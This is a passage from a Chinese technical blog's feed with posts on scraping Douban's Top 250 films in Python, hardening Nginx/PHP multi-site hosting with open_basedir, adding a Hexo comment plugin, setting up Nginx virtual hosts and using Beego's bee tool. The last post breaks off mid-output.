        <content type="html"><![CDATA[<h1 id="豆瓣TOP250"><a href="#豆瓣TOP250" class="headerlink" title="豆瓣TOP250"></a>豆瓣TOP250</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>记得当初去参加大数据比赛的时候有个环节是对数据清洗。你可以理解前期已经是做好了，你只需要后期，针对已经获得的数据进行分析。里面就有对电影分析的，还需要针对获取的数据进行作图（matplotlib）。想尝试自己去爬数据并对数据进行清洗分析统计。  </p></blockquote><h2 id="1-网页分析"><a href="#1-网页分析" class="headerlink" title="1. 网页分析"></a>1. 网页分析</h2><p> 站点：<a href="https://movie.douban.com/top250" target="_blank" rel="noopener">豆瓣电影 Top 250</a><br> 并不像爬B站那个一样只需要针对请求API获得的json进行分析。我们需要针对网页（HTML）进行分析，有一个神器登场（Beautiful Soup）。可以从HTML，XML中提取数据的python模块。</p><h3 id="1-1获取网页"><a href="#1-1获取网页" class="headerlink" title="1.1获取网页"></a>1.1获取网页</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- conding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_html</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        req = requests.get(url)</span><br><span class="line">        req.encoding = <span class="string">'utf-8'</span></span><br><span class="line">        <span class="keyword">if</span> req.status_code == <span class="number">200</span> :</span><br><span class="line">            data = req.text</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[-] "</span>+url +<span class="string">" error"</span> </span><br><span class="line">    <span class="keyword">except</span> Exception,e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    douban_url = <span class="string">"https://movie.douban.com/top250"</span></span><br><span class="line">    get_html(douban_url)</span><br></pre></td></tr></table></figure></div><h4 id="如果你想尝试print？？？-stop-你绝对报错的。"><a href="#如果你想尝试print？？？-stop-你绝对报错的。" class="headerlink" title="如果你想尝试print？？？ stop!!! 你绝对报错的。"></a>如果你想尝试print？？？ stop!!! 你绝对报错的。</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;gbk&apos; codec can&apos;t encode character u&apos;\xee&apos; in position 21861: illegal multibyte sequence</span><br></pre></td></tr></table></figure></div><p> 编码这个东西很玄学的，我也很好奇，网易一般就是UTF-8，我还encode了它？但是还是不行。网上的猜测都是说“本身Unicode类型的字符中，包含了一些无法转换为GBK编码的一些字符。”没关系我们并不需要print出来去看html，浏览器没有更方便？</p><h3 id="1-2-分析网页"><a href="#1-2-分析网页" class="headerlink" title="1.2 分析网页"></a>1.2 分析网页</h3><p><a href="https://image.kalifun.top/upload/1812/9a4fd4c4917b0dc3.png" target="_blank" rel="noopener"><img src="https://image.kalifun.top/upload/1812/9a4fd4c4917b0dc3.png" alt></a><br>其实可用的信息很多，根据自己想实现的效果来获取具体的信息。<br><a href="https://image.kalifun.top/upload/1812/d86ddf15e5c3d67f.png" target="_blank" rel="noopener"><img src="https://image.kalifun.top/upload/1812/d86ddf15e5c3d67f.png" alt></a><br> 你会发现整个关于电影的是在ol这个标签里，所以我们所需要这个标签里的代码。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allmovie = soup.find(name=<span class="string">'ol'</span>,class_=<span class="string">'grid_view'</span>)</span><br></pre></td></tr></table></figure></div><p> 看图片可以看懂每一个电影的信息都在li的标签里。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movielist = allmovie.find_all(name=<span class="string">'li'</span>)</span><br></pre></td></tr></table></figure></div><h2 id="2-使用beautifulsoup"><a href="#2-使用beautifulsoup" class="headerlink" title="2.使用beautifulsoup"></a>2.使用beautifulsoup</h2><p>contents<br> 根据文档树进行搜索，返回标记对象（tag）的列表,注意，直接.contents，返回的是列表，不是单一元素。使用contents向后遍历树，使用parent向前遍历树</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">soup = BeautifulSoup(data,<span class="string">'html.parser'</span>)</span><br><span class="line">all_content = soup.find(name=<span class="string">'ol'</span>,class_=<span class="string">'grid_view'</span>)</span><br><span class="line">all_movies = all_content.find_all(name=<span class="string">'li'</span>)</span><br><span class="line"><span class="keyword">for</span> single <span class="keyword">in</span> all_movies:</span><br><span class="line">    top_num = single.find(name=<span class="string">'em'</span>).string</span><br><span class="line">    title = single.find_all(name=<span class="string">'span'</span>,class_=<span class="string">'title'</span>)</span><br><span class="line">    chiness_name = title[<span class="number">0</span>].string</span><br><span class="line">    class_bd = single.find(name=<span class="string">'div'</span>,class_=<span class="string">'bd'</span>).contents</span><br><span class="line">    movie_yearth = re.findall(<span class="string">r'\d&#123;4&#125;'</span>,str(class_bd[<span class="number">1</span>]))[<span class="number">0</span>]</span><br><span class="line">    movie_rating = re.findall(<span class="string">r'\d?\.\d'</span>,str(class_bd[<span class="number">3</span>]))[<span class="number">0</span>]</span><br><span class="line">    movie_country = re.findall(<span class="string">r'\d&#123;4&#125;.*$/'</span>,str(class_bd[<span class="number">1</span>]))</span><br><span class="line">    movie_eval = class_bd[<span class="number">3</span>].find_all(name=<span class="string">'span'</span>)[<span class="number">-1</span>]</span><br></pre></td></tr></table></figure></div><p>后续我将html保存到文件中，这样应该可以解决编码报错的问题。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>open_basedir防跨站</title>
      <link href="/2018/11/28/open-basedir-fang-kua-zhan/"/>
      <url>/2018/11/28/open-basedir-fang-kua-zhan/</url>
      
        <content type="html"><![CDATA[<h1 id="open-basedir防跨站"><a href="#open-basedir防跨站" class="headerlink" title="open_basedir防跨站"></a>open_basedir防跨站</h1><blockquote><p>多站点时担忧自己因为某个站点因为存在漏洞导致整个网站被沦陷。这里介绍服务权限层的防御（open_basedir）。<br>在搭建网站时请不要直接给站点目录为777权限，及设置目录归属为服务用户，不要为root用户。</p></blockquote><h2 id="1-跨站"><a href="#1-跨站" class="headerlink" title="1.跨站"></a>1.跨站</h2><p>学过信息安全的可能听到跨站很快会想到CSRF,XSS这两个词，但是这里主要说的是不同虚拟主机进行跨站（从A站点目录到B站点目录）。列：当获取A站点的webshell其他站点目录也可以随意进入了。  </p><h2 id="2-open-basedir设置"><a href="#2-open-basedir设置" class="headerlink" title="2.open_basedir设置"></a>2.open_basedir设置</h2><h3 id="2-1-fastcgi-conf"><a href="#2-1-fastcgi-conf" class="headerlink" title="2.1 fastcgi.conf"></a>2.1 fastcgi.conf</h3><p>我们可以查看nginx.conf目录下有一个fastcgi.conf配置文件。查看最后一行是否有下面代码。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NGINX"><figure class="iseeu highlight /nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fastcgi_param</span> PHP_ADMIN_VALUE    <span class="string">"open_basedir=<span class="variable">$document_root</span>:/tmp/:/proc/"</span>;</span><br></pre></td></tr></table></figure></div><p>如果没有可以添加在最后一行。<br>在上篇文章我提到虚拟主机配置中有include fastcgi.conf。如果这些都齐全了，重启服务就可以实现了。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$document_root 这个是我们设置虚拟主机配置文件的站点地址</span><br><span class="line">列：</span><br><span class="line">    &#123;</span><br><span class="line"><span class="attribute">listen</span>       <span class="number">80</span>;    </span><br><span class="line">server_name xxx.com;   //你的域名，二级域名，ip</span><br><span class="line">index index.php index.html index.htm default.html default.htm default.php;   //默认寻找主页文件</span><br><span class="line">root  /home/www/xxx;    $document_root</span><br><span class="line">&#125;</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line"><span class="comment">### 2.2 php.ini</span></span><br><span class="line">先确认自己php版本是否是5.3.3+，如果是5.3.3+的话可以直接在php.ini后面添加语句。</span><br><span class="line">``` php</span><br><span class="line">[HOST=www.asite.com]    域名</span><br><span class="line">open_basedir=/home/wwwroot/asite/:/tmp/     一定需要在asite后面加入/，不然可以遍历</span><br><span class="line">[PATH=/home/wwwroot/asite]</span><br><span class="line">open_basedir=/home/wwwroot/asite/:/tmp/</span><br></pre></td></tr></table></figure><p>请在填写open_basedir地址时以/结束目录。如果你是site1,site2这样来设置自己站点目录名称将可以绕过。  </p><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h2><p>open_basedir这个并不能完全可靠，可能会被绕过。可以给每个站点单独开php-fpm,这样一个站点被沦陷也无法被利用。</p>]]></content>
      
      
      <categories>
          
          <category> Nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo加入评论功能(来必力)</title>
      <link href="/2018/11/28/hexo-jia-ru-ping-lun-gong-neng-lai-bi-li/"/>
      <url>/2018/11/28/hexo-jia-ru-ping-lun-gong-neng-lai-bi-li/</url>
      
        <content type="html"><![CDATA[<h1 id="hexo加入评论功能-来必力"><a href="#hexo加入评论功能-来必力" class="headerlink" title="hexo加入评论功能(来必力)"></a>hexo加入评论功能(来必力)</h1><p><img src="http://image.kalifun.top/upload/1811/e1473e15e5c7d305.png" alt="laibili"></p><h2 id="1-登录注册"><a href="#1-登录注册" class="headerlink" title="1.登录注册"></a>1.登录注册</h2><p> <a href="https://www.livere.com/" target="_blank" rel="noopener">来必力</a>，如何登录注册我就不冗余了，随便搞个邮箱什么的就可以了。  </p><h2 id="2-来必力配置"><a href="#2-来必力配置" class="headerlink" title="2.来必力配置"></a>2.来必力配置</h2><p> 来到代码管理选择一般网站里面有一个data-uid<br> 再来到你主题目录下有一个_config.yml，进行搜索查找关键词livere_uid</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">livere_uid : xxxxxxxxxxxxx</span><br></pre></td></tr></table></figure></div><h3 id="然后提交代码到github就实现功能了。"><a href="#然后提交代码到github就实现功能了。" class="headerlink" title="然后提交代码到github就实现功能了。"></a>然后提交代码到github就实现功能了。</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure></div><p> 上面是主题支持来必力功能的。<br>如果不支持，那百度找找吧，我也没测试过，就不给教程了。<br>还有这个是一个韩国人的东西，如果抵制的话，那就弃坑选择其他的评论插件吧。</p>]]></content>
      
      
      <categories>
          
          <category> 站点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> 来必力 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx多站点也变得轻松起来（虚拟主机）</title>
      <link href="/2018/11/27/nginx-duo-zhan-dian-ye-bian-de-qing-song-qi-lai-xu-ni-zhu-ji/"/>
      <url>/2018/11/27/nginx-duo-zhan-dian-ye-bian-de-qing-song-qi-lai-xu-ni-zhu-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="Nginx多站点也变得轻松起来（虚拟主机）"><a href="#Nginx多站点也变得轻松起来（虚拟主机）" class="headerlink" title="Nginx多站点也变得轻松起来（虚拟主机）"></a>Nginx多站点也变得轻松起来（虚拟主机）</h1><h2 id="1-Nginx"><a href="#1-Nginx" class="headerlink" title="1.Nginx"></a>1.<a href="http://nginx.org/en/" target="_blank" rel="noopener">Nginx</a></h2><blockquote><p>Nginx是<a href="https://baike.baidu.com/item/WEB%E6%9C%8D%E5%8A%A1%E5%99%A8/8390210?fr=aladdin" target="_blank" rel="noopener">WEB服务器</a>，常见的还有<a href="http://www.apache.org/" target="_blank" rel="noopener">Apache</a>.这里我就不过多去说两个的优缺点，如果不的站点计划使用Nginx希望可以对你有帮助。</p></blockquote><h2 id="2-环境介绍"><a href="#2-环境介绍" class="headerlink" title="2.环境介绍"></a>2.环境介绍</h2><ul><li>系统：Linux</li><li>Web服务器：Nginx</li><li>数据库 ：<a href="https://mariadb.org/" target="_blank" rel="noopener">MariaDB</a></li><li>脚本语言：PHP</li></ul><p>你可以每个程序下载安装，然后配置连接好。还有一种方案就是一键安装环境。</p><p><a href="https://lnmp.org/" target="_blank" rel="noopener">LNMP</a>，<a href="https://oneinstack.com/" target="_blank" rel="noopener">OneinStack</a>这样你无需烦恼如何去配置环境，一键帮你搞定。如果是企业级建议手动安装每一个程序。如果你不是安装lnmp环境的话，你可以选择OneinStack,它有很多组合选择。</p><h2 id="3-配置"><a href="#3-配置" class="headerlink" title="3.配置"></a>3.配置</h2><h3 id="3-1首先查看nginx-conf文件。在最后几行你会看到"><a href="#3-1首先查看nginx-conf文件。在最后几行你会看到" class="headerlink" title="3.1首先查看nginx.conf文件。在最后几行你会看到"></a>3.1首先查看nginx.conf文件。在最后几行你会看到</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NGINX"><figure class="iseeu highlight /nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">include</span>  host/<span class="regexp">*.conf</span>;</span><br></pre></td></tr></table></figure></div><h3 id="3-2如果未能找到你可以在最后面添加"><a href="#3-2如果未能找到你可以在最后面添加" class="headerlink" title="3.2如果未能找到你可以在最后面添加"></a>3.2如果未能找到你可以在最后面添加</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NGINX"><figure class="iseeu highlight /nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">include</span> host/<span class="regexp">*.conf</span>;</span><br></pre></td></tr></table></figure></div><p>并在nginx.conf文件目录下创建host这个目录。</p><h3 id="3-3创建虚拟主机配置文件"><a href="#3-3创建虚拟主机配置文件" class="headerlink" title="3.3创建虚拟主机配置文件"></a>3.3创建虚拟主机配置文件</h3><h3 id="xxx-conf"><a href="#xxx-conf" class="headerlink" title="xxx.conf"></a>xxx.conf</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NGINX"><figure class="iseeu highlight /nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">server</span><br><span class="line">&#123;</span><br><span class="line"><span class="attribute">listen</span>       <span class="number">80</span>;    </span><br><span class="line">server_name xxx.com;   //你的域名，二级域名，ip</span><br><span class="line">index index.php index.html index.htm default.html default.htm default.php;   //默认寻找主页文件</span><br><span class="line">root  /home/www/xxx;       //站点的目录地址</span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~ .*\.(php|php5)?$</span>        </span><br><span class="line">&#123;</span><br><span class="line"><span class="attribute">fastcgi_pass</span>  unix:/tmp/php-cgi.sock;</span><br><span class="line"><span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line">include fastcgi.conf;     //</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> /status &#123;</span><br><span class="line"><span class="attribute">stub_status</span> <span class="literal">on</span>;</span><br><span class="line"><span class="attribute">access_log</span>   <span class="literal">off</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~ .*\.(gif|jpg|jpeg|png|bmp|swf)$</span></span><br><span class="line"><span class="regexp"></span>&#123;</span><br><span class="line">expires      30d;   //对于不怎么更新站点静态文件的话，可以把时间设大，让浏览器缓存降低对服务器流量带宽的压力。</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~ .*\.(js|css)?$</span></span><br><span class="line"><span class="regexp"></span>&#123;</span><br><span class="line"><span class="attribute">expires</span>      <span class="number">12h</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">access_log off;    //这里你可以配置地址及文件名称，对网站访问日志感谢可以开启，说不定也能查问题。</span><br><span class="line"><span class="comment">#access_log logs/access.log main;   根据这个格式来修改。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>在host目录下可以创建多个文件，看你自己需要什么。不管是一级域名还是二级域名，还是多个域名都可以。</p><p>后期我可能会在基础上更新一些相关网站策略，负责均衡，HTTPS文章。</p>]]></content>
      
      
      <categories>
          
          <category> Nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Beego</title>
      <link href="/2018/11/22/beego/"/>
      <url>/2018/11/22/beego/</url>
      
        <content type="html"><![CDATA[<h1 id="Beego"><a href="#Beego" class="headerlink" title="Beego"></a>Beego</h1><h2 id="bee工具简介"><a href="#bee工具简介" class="headerlink" title="bee工具简介"></a>bee工具简介</h2><h3 id="bee工具是一个为了协助开发beego项目而创建的项目。"><a href="#bee工具是一个为了协助开发beego项目而创建的项目。" class="headerlink" title="bee工具是一个为了协助开发beego项目而创建的项目。"></a>bee工具是一个为了协助开发<a href="https://beego.me/" target="_blank" rel="noopener">beego</a>项目而创建的项目。</h3><h2 id="bee安装"><a href="#bee安装" class="headerlink" title="bee安装"></a>bee安装</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> get github.com/beego/bee</span><br></pre></td></tr></table></figure></div><h4 id="安装完之后，bee可执行文件默认放到-GOPATH-bin里面，Windows默认已经添加了环境变量。mac安装完成需要自己添加环境变量。"><a href="#安装完之后，bee可执行文件默认放到-GOPATH-bin里面，Windows默认已经添加了环境变量。mac安装完成需要自己添加环境变量。" class="headerlink" title="安装完之后，bee可执行文件默认放到$GOPATH/bin里面，Windows默认已经添加了环境变量。mac安装完成需要自己添加环境变量。"></a>安装完之后，bee可执行文件默认放到$GOPATH/bin里面，Windows默认已经添加了环境变量。mac安装完成需要自己添加环境变量。</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'export GOPATH=""'</span> &gt;&gt; ~/.zshrc</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'export PATH="$GOPATH/bin:$PATH"'</span> &gt;&gt; ~/.zshrc</span><br></pre></td></tr></table></figure></div><h2 id="bee工具命令详解"><a href="#bee工具命令详解" class="headerlink" title="bee工具命令详解"></a>bee工具命令详解</h2><h3 id="bee命令"><a href="#bee命令" class="headerlink" title="bee命令"></a>bee命令</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ bee</span><br><span class="line">Bee is a Fast and Flexible tool <span class="keyword">for</span> managing your Beego Web Application.</span><br><span class="line"></span><br><span class="line">USAGE</span><br><span class="line">    bee <span class="built_in">command</span> [arguments]</span><br><span class="line"></span><br><span class="line">AVAILABLE COMMANDS</span><br><span class="line"></span><br><span class="line">    version     Prints the current Bee version</span><br><span class="line">    migrate     Runs database migrations</span><br><span class="line">    api         Creates a Beego API application</span><br><span class="line">    bale        Transforms non-Go files to Go <span class="built_in">source</span> files</span><br><span class="line">    fix         Fixes your application by making it compatible with newer versions of Beego</span><br><span class="line">    dlv         Start a debugging session using Delve</span><br><span class="line">    dockerize   Generates a Dockerfile <span class="keyword">for</span> your Beego application</span><br><span class="line">    generate    Source code generator</span><br><span class="line">    hprose      Creates an RPC application based on Hprose and Beego frameworks</span><br><span class="line">    new         Creates a Beego application</span><br><span class="line">    pack        Compresses a Beego application into a single file</span><br><span class="line">    rs          Run customized scripts</span><br><span class="line">    run         Run the application by starting a <span class="built_in">local</span> development server</span><br><span class="line">    server      serving static content over HTTP on port</span><br><span class="line"></span><br><span class="line">Use bee <span class="built_in">help</span> [<span class="built_in">command</span>] <span class="keyword">for</span> more information about a <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">ADDITIONAL HELP TOPICS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Use bee <span class="built_in">help</span> [topic] <span class="keyword">for</span> more information about that topic.</span><br></pre></td></tr></table></figure></div><h3 id="new命令"><a href="#new命令" class="headerlink" title="new命令"></a>new命令</h3><h4 id="new命令是用来新建一个web项目，我们执行"><a href="#new命令是用来新建一个web项目，我们执行" class="headerlink" title="new命令是用来新建一个web项目，我们执行"></a>new命令是用来新建一个web项目，我们执行<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><figcaption><span>new <项目名称>```。将会在$GOPATH/src目录下创建文件夹。</项目名称></span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">```go</span><br><span class="line">$ bee new beeg</span><br><span class="line">______</span><br><span class="line">| ___ \</span><br><span class="line">| |_/ /  ___   ___</span><br><span class="line">| ___ \ / _ \ / _ \</span><br><span class="line">| |_/ /|  __/|  __/</span><br><span class="line">\____/  \___| \___| v1.10.0</span><br><span class="line">2018/10/31 23:20:44 WARN     ▶ 0001 You current workdir is not inside $GOPATH/src.</span><br><span class="line">2018/10/31 23:20:44 INFO     ▶ 0002 Creating application...</span><br><span class="line">create /Users/fun/go/src/beeg/</span><br><span class="line">create /Users/fun/go/src/beeg/conf/</span><br><span class="line">create /Users/fun/go/src/beeg/controllers/</span><br><span class="line">create /Users/fun/go/src/beeg/models/</span><br><span class="line">create /Users/fun/go/src/beeg/routers/</span><br><span class="line">create /Users/fun/go/src/beeg/tests/</span><br><span class="line">create /Users/fun/go/src/beeg/static/</span><br><span class="line">create /Users/fun/go/src/beeg/static/js/</span><br><span class="line">create /Users/fun/go/src/beeg/static/css/</span><br><span class="line">create /Users/fun/go/src/beeg/static/img/</span><br><span class="line">create /Users/fun/go/src/beeg/views/</span><br><span class="line">create /Users/fun/go/src/beeg/conf/app.conf</span><br><span class="line">create /Users/fun/go/src/beeg/controllers/default.go</span><br><span class="line">create /Users/fun/go/src/beeg/views/index.tpl</span><br><span class="line">create /Users/fun/go/src/beeg/routers/router.go</span><br><span class="line">create /Users/fun/go/src/beeg/tests/default_test.go</span><br><span class="line">create /Users/fun/go/src/beeg/main.go</span><br><span class="line">2018/10/31 23:20:44 SUCCESS  ▶ 0003 New application successfully created!</span><br></pre></td></tr></table></figure></div></h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">├── conf</span><br><span class="line">│   └── app.conf</span><br><span class="line">├── controllers</span><br><span class="line">│   └── default.go</span><br><span class="line">├── main.go</span><br><span class="line">├── models</span><br><span class="line">├── routers</span><br><span class="line">│   └── router.go</span><br><span class="line">├── static</span><br><span class="line">│   ├── css</span><br><span class="line">│   ├── img</span><br><span class="line">│   └── js</span><br><span class="line">│   └── reload.min.js</span><br><span class="line">├── tests</span><br><span class="line">│   └── default_test.go</span><br><span class="line">└── views</span><br><span class="line">    └── index.tpl</span><br></pre></td></tr></table></figure></div><h3 id="api命令"><a href="#api命令" class="headerlink" title="api命令"></a>api命令</h3><h4 id="api命令是用来创建api应用的。"><a href="#api命令是用来创建api应用的。" class="headerlink" title="api命令是用来创建api应用的。"></a>api命令是用来创建api应用的。</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ bee api beeg</span><br><span class="line">______</span><br><span class="line">| ___ \</span><br><span class="line">| |_/ /  ___   ___</span><br><span class="line">| ___ \ / _ \ / _ \</span><br><span class="line">| |_/ /|  __/|  __/</span><br><span class="line">\____/  \___| \___| v1<span class="number">.10</span><span class="number">.0</span></span><br><span class="line"><span class="number">2018</span>/<span class="number">10</span>/<span class="number">31</span> <span class="number">23</span>:<span class="number">46</span>:<span class="number">46</span> INFO     ▶ <span class="number">0001</span> Creating API...</span><br><span class="line">create /Users/fun/<span class="keyword">go</span>/src/beeg</span><br><span class="line">create /Users/fun/<span 